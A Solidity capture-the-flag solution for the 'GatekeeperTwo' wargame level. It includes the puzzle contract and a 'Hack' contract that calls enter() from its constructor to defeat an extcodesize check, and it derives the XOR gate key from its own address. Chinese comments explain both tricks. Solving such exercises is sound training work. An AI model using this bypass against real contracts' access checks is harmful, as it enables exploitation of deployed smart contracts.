// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
    constructor(GatekeeperTwo target) {

    uint64 s =uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ;
    uint64 k=s^type(uint64).max;
    bytes8 key =bytes8(k);//就第三个比较抽象，利用异或的性质即a^a^b=b
        require(target.enter(key),"failed");
    }

}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }//这个构造函数的意义在于使得x等于上一个调用者的代码量
    //似乎使得调用者不能为合约
    require(x == 0);//但是实际上，这个当一个合约在被部署的时候，它的代码量就是0
    //也就是说，直接在构造函数中传入并调用这个函数，而不是现部署再输入调用的地址
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
